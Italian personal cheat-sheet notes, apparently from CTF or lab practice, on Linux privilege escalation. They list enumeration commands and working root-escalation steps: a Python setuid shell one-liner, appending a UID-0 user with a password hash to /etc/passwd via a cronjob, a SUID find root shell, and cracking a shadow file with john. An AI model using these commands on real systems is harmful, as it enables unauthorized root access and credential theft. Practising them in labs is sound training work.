##### COMANDI UTILI
- `uname -a`
- `cat /etc/os-release`
- `cat /etc/passwd | grep "bash"`
	- ci interessano gli utenti bash per poter eseguire i comandi
- `id`
	- ti stampa utente e gruppo
- `sudo -l`
	- dice la lista dei comandi in quanto sudo eseguibili
	- dal nostro profilo utente
- `ls -la nomefile`
	- dice i dettagli su quel determinato file 
	- permessi ecc
- `sudo -u nomeutente`
	- eseguo sudo con un certo utente
- `cat bash_history`
	- nella cartella utente per vedere la sua history
- di solito su `su nomeutente nomeutente`
	- può funzionare
- usare le capabilities per fare `suid` o `guid`
	- `getcap -r / 2>/dev/null`
		- cerca le capabilities dentro il sistema
		- cerca la capability dentro `gtfobins`
		- `python -c 'import os; os.setuid(0); os.system(/bin/bash);'`
- uso dei crontab
	- `crontab -l`
	- ti da la lista dei cronjob
- trovare file che hanno SETUID/SETGID attivo
	- `find / -perm -u=s -type f 2>/dev/null`
		- `-perm` filtra in base ai permessi
	- `find / -perm /utente `
	- così è possibile trovare un determinato file con suid
		- con `su -p` possiamo eseguire quel file con effective `uid` di quell'utente
		- se file non eseguibile `chmod a+x eseguibile`
		- uso `pspy64` per vedere i cronjobs senza root

creare un utente in `/etc/passwd`
`nome:passhash:0:0:/root:/bin/bash`
- es: 
	- per creare `passhash` uso `openssl passwd -1 AAA`
	- in questa vulnerabilità dentro un file era presente una bash particolare, non ricordo come l'ho trovata ma ti permetteva di eseguire cose come utente `vdsi`
- con `pspy64` è stato trovato un cronjob che ogni tot scriveva, ho messo che poteva fare append in `/etc/passwd`
	- `echo 'sbers:$1$09SwDPRJ$cjx.ZcPD2r4WNXSKZVNPO1:0:0:/root:/bin/bash' >> /etc/passwd`
- altra vulnerabilità trovata:
	- con `find /perm -u=s -type f 2>/dev/null`
		- ho trovato che find è con un qualche `suid`
		- facendo `ls -la /bin/find`
			- ho scoperto che il suid di find é root, allora eseguo:
				- `find . -exec /bin/sh -p \; -quit`
				- trovato su GTFOBins
`find / -group 42  2>/dev/null`
`john -w=/usr/share/wordlists/rockyou.txt shadow2`
